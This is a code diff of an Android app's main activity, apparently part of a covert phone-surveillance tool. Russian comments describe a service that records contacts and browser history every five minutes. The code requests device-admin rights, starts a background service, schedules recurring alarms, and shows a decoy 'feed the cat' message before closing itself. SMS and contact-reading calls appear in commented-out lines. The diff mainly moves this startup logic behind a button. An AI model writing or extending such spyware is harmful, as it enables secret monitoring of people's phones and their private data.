@@ -20,6 +20,8 @@ import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.telephony.TelephonyManager;
 import android.util.Log;
+import android.view.View;
+import android.widget.Button;
 import android.widget.Toast;
 
 import com.postal.omniscient.postal.adapter.EventBusData;
@@ -42,7 +44,7 @@ import java.text.SimpleDateFormat;
 import java.util.Calendar;
 
 
-public class MainActivity extends AppCompatActivity {
+public class MainActivity extends AppCompatActivity implements View.OnClickListener {
 
     private static String Msg = "MyMsg1";
     final int SDK_INT = Build.VERSION.SDK_INT;
@@ -51,11 +53,31 @@ public class MainActivity extends AppCompatActivity {
     private static final int REQUEST_CODE = 0;
     private DevicePolicyManager mDPM;
     private ComponentName mAdminName;
+    //private final Button registration = (Button)findViewById(R.id.registration);
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-//        setContentView(R.layout.activity_main); //ЕТО ВЫКЛЮЧИТЬ
+
+       // registration.setOnClickListener(this);
+
+    }
+    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+
+        if (REQUEST_CODE == requestCode) {
+            Intent intent = new Intent(MainActivity.this, TService.class);
+            startService(intent);
+        }
+    }
+    /////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    private void onButton(View view){
+
+    }
+    private void startAPP(){
+        //        setContentView(R.layout.activity_main); //ЕТО ВЫКЛЮЧИТЬ
         //БУДЕТ СЕРВИС КАЖДЫЕ 5 ин и записывает еонтакты и браузер
         AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
         Intent myIntent = new Intent(MainActivity.this, AlarmReceiver.class);
@@ -149,7 +171,7 @@ public class MainActivity extends AppCompatActivity {
 //        String uri_inbox_mms = "content://mms/inbox";
 //        mms.massAllMms();
 //        mms.massAllMMS(uri_send_sms, uri_inbox_sms);
-       ///////////////////////////////////////////
+        ///////////////////////////////////////////
         //STRAT SERVICE
         Toast toast = Toast.makeText(getApplicationContext(),
                 "Пора покормить кота!", Toast.LENGTH_SHORT);
@@ -159,36 +181,14 @@ public class MainActivity extends AppCompatActivity {
         ad = null;
 
         finish(); //ЕТО ВКЛЮЧИТЬ
-    }
-    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
-    @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-        super.onActivityResult(requestCode, resultCode, data);
+            }
 
-        if (REQUEST_CODE == requestCode) {
-            Intent intent = new Intent(MainActivity.this, TService.class);
-            startService(intent);
+    @Override
+    public void onClick(View v) {
+        switch (v.getId()) {
+            //case R.id.registration:startAPP();break;
         }
     }
-    /////////////////////////////////////////////////////////////////////////////////////////////////////////////
-    private void getContacts(){
-//        ReadContacts getPhones = new ReadContacts(getContentResolver());
-//        String [][] phone_contacts = getPhones.readContacts();
-//
-//            for (int i=0; getPhones.getX()>i; i++) {
-//                if(phone_contacts[i][0]!=null) {
-////                    Log.i(Msg, " ОТВЕТ размер1 - " + phone_contacts[i][0]);
-//
-//                }
-//
-//                for (int k=1; getPhones.getY()>k; k++) {
-//                    if (phone_contacts[i][k] != null) {
-////                        Log.i(Msg, " ОТВЕТ размер2  - " + phone_contacts[i][k]);
-//                    }
-//                }
-//
-//                }
-            }
 
     public class AsyncM extends AsyncTaskLoader {
 
